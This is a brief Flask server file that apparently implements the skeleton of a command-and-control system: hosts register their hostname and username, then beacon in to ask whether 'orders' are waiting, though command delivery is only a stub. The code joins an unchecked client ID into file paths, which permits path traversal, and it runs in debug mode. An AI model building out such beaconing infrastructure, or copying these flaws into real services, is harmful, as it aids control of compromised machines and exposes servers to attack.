import os
import json
from flask import Flask, jsonify, request, render_template
from datetime import datetime
from application.clientshit import ClientMethods

app = Flask(__name__)
app.debug = True

# instantiate client methods
clientmethod = ClientMethods()

@app.route("/")
@app.route("/index")
def main():
    client_files = os.listdir("clients")
    all_clients = {}
    for client_file in client_files:
        with open("clients\\"+client_file, "r") as cfile:
            cdata = json.load(cfile)
            all_clients[client_file] = cdata
    print(all_clients)
    return render_template("index.html", all_clients=all_clients)

@app.route("/api/v1/add-client")
def add_client():
    # create a new client file on the server
    client_config = {"clientid": request.args.get("clientid"),
                     "hostname": request.args.get("hostname"),
                     "username": request.args.get("username"),
                     "last_checkin": str(datetime.now())}
    client_filepath = os.path.join("clients", client_config["clientid"])
    # if client file does not already exist, create it
    if not os.path.isfile(client_filepath):
        with open(client_filepath, "w") as clientfile:
            clientfile.write(json.dumps(client_config))
        return jsonify({'client': 'created'})
    else:
        return jsonify({'client': 'exists'})

# check server status
@app.route("/api/v1/status")
def heartbeat():
    data = {"status": "online"}
    return jsonify(data)

# beacon api for clients
@app.route("/api/v1/beacon")
def command():
    # create path to command file
    clientmethod.last_checkin(request.args.get("clientid"))
    commands = os.path.join("commands", request.args.get("clientid"))
    if os.path.isfile(commands):
        return jsonify({"commands":"here are your orders"})
    elif not os.path.isfile(commands):
        return jsonify({"commands":"no_commands"})

